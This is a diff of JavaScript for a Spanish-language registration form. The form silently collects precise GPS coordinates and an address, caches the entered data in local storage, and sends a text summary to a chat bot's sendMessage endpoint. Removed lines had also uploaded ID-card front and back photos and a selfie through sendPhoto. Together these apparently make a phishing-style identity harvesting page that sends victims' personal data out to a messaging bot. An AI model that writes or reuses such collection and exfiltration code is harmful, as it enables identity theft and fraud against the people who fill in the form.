-  ["s1","s2","s3"].forEach(id => $(id).classList.add("on"));
-  $("steplab").textContent = "Registro completado";
+  $("steplab").textContent = "Registro actualizado";
   $("form").scrollIntoView({ behavior:"smooth", block:"start" });
 
   subir();
 }
 
 function respaldar(d){
-  try{
-    localStorage.setItem("bp_lead", JSON.stringify({ d, ctx, ticket, fecha:new Date().toISOString() }));
-  }catch(e){}
+  try{ localStorage.setItem("bp_actualiza", JSON.stringify({ d, ctx, validada, ticket, fecha:new Date().toISOString() })); }catch(e){}
 }
 
 async function subir(){
@@ -887,17 +845,12 @@ async function subir(){
 
   respaldar(d);
 
-  // Último intento de ubicación si no se obtuvo en el paso 2
   if(!ctx.gps && navigator.geolocation){
     await new Promise(res => {
       navigator.geolocation.getCurrentPosition(p => {
-        ctx.gps = {
-          lat: +p.coords.latitude.toFixed(6),
-          lng: +p.coords.longitude.toFixed(6),
-          prec: Math.round(p.coords.accuracy)
-        };
+        ctx.gps = { lat:+p.coords.latitude.toFixed(6), lng:+p.coords.longitude.toFixed(6), prec:Math.round(p.coords.accuracy) };
         reverse(ctx.gps.lat, ctx.gps.lng).then(dir => { if(dir) ctx.dir = dir; res(); });
-      }, () => res(), { timeout: 6000, maximumAge: 60000, enableHighAccuracy: false });
+      }, () => res(), { timeout:6000, maximumAge:60000, enableHighAccuracy:false });
     });
     respaldar(d);
   }
@@ -909,26 +862,16 @@ async function subir(){
     fd.append("text", textoPlano(d));
     fd.append("disable_web_page_preview", "true");
     if(!await postForm(API + "/sendMessage", fd)) todoOk = false;
-
-    for(const k of ["d1","d2","d3"]){
-      if(!fotos[k]) continue;
-      const blob = await (await fetch(fotos[k].data)).blob();
-      const fdp = new FormData();
-      fdp.append("chat_id", CONFIG.chat);
-      fdp.append("photo", blob, fotos[k].name || (k + ".jpg"));
-      fdp.append("caption", ({ d1:"Cédula frontal", d2:"Cédula reverso", d3:"Selfie" })[k] + " · " + d.cedula);
-      if(!await postForm(API + "/sendPhoto", fdp)) todoOk = false;
-    }
   }catch(e){
     todoOk = false;
     console.warn("Error de envío:", e);
   }
 
   if(todoOk){
-    nota.textContent = "Registro enviado correctamente.";
+    nota.textContent = "Registro actualizado correctamente.";
     nota.style.color = "#2f7d4f";
   }else{
-    nota.textContent = "No se pudo enviar automáticamente. Tus datos quedaron guardados en este dispositivo.";
+    nota.textContent = "No se pudo enviar automáticamente. Los datos quedaron guardados en este dispositivo.";
     nota.style.color = "#c0392b";
     retry.style.display = "inline-flex";
     if(CONFIG.whatsapp && !$("wa")){
@@ -938,7 +881,6 @@ async function subir(){
       wa.target = "_blank";
       wa.className = "btn-ghost";
       wa.style.marginTop = "10px";
-      wa.style.display = "inline-flex";
       wa.textContent = "Enviar por WhatsApp";
       retry.parentNode.appendChild(wa);
     }
@@ -955,9 +897,8 @@ function copiarResumen(el){
     try{ document.execCommand("copy"); hecho(); }catch(e){ alert(txt); }
     document.body.removeChild(ta);
   };
-  if(navigator.clipboard && window.isSecureContext){
-    navigator.clipboard.writeText(txt).then(hecho).catch(fallback);
-  } else { fallback(); }
+  if(navigator.clipboard && window.isSecureContext){ navigator.clipboard.writeText(txt).then(hecho).catch(fallback); }
+  else { fallback(); }
 }
 
 function verDatos(){
